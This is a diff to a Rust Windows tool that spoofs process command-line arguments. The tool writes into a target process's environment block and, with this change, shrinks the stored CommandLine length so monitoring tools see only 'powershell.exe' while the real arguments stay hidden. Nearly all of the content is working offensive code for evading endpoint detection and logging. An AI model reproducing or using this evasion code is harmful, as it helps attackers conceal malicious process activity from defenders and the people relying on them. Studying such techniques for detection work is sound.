@@ -1,14 +1,14 @@
 mod peb_structs;
 
 use std::{
-    ffi::{CString, OsStr}, mem::zeroed, os::windows::ffi::OsStrExt, ptr::{null, null_mut}
+    ffi::{CString, OsStr}, mem::{offset_of, zeroed}, os::windows::ffi::OsStrExt, ptr::{null, null_mut}
 };
 
 use winapi::{
     ctypes::c_void,
     shared::{
         minwindef::{PULONG, ULONG},
-        ntdef::{NTSTATUS, PVOID},
+        ntdef::{NTSTATUS, PVOID, UNICODE_STRING},
     },
     um::{
         errhandlingapi::GetLastError,
@@ -197,7 +197,7 @@ fn spoof_args(
         };
         println!("[+] Original Command Line: {}", cmd_line);
 
-        pause();
+        // pause();
 
         let mut wide_args: Vec<u16> = OsStr::new(org_args).encode_wide().chain(std::iter::once(0)).collect();
         let buffer_size = wide_args.len() * size_of::<u16>();
@@ -217,10 +217,24 @@ fn spoof_args(
             return false;
         }
 
+        let mut new_len: u16 = "powershell.exe".len() as u16 * 2; // size in bytes
+        let length_offset = offset_of!(RTL_USER_PROCESS_PARAMETERS, CommandLine) + offset_of!(UNICODE_STRING, Length);
+        let length_address = ((*peb).ProcessParameters as *mut u8).add(length_offset) as PVOID;    
+
+        println!(
+            "[i] Updating The Length Of The Process Argument From {} To {} ...",
+            params.CommandLine.Length,
+            new_len
+        );
+
+        let mut new_len_ptr = &mut new_len as *mut u16 as *mut c_void;
+        write_process_memory(pi.hProcess, length_address, &mut new_len_ptr, size_of::<u16>());
+
+
         HeapFree(GetProcessHeap(), 0, peb_buffer);
         HeapFree(GetProcessHeap(), 0, param_buffer);
 
-        pause();
+        // pause();
 
         ResumeThread(pi.hThread);
 
@@ -251,6 +265,7 @@ fn main() {
         &mut h_process,
         &mut h_thread,
     );
+
 
     println!("[+] Created process with PID: {}", pid);
 
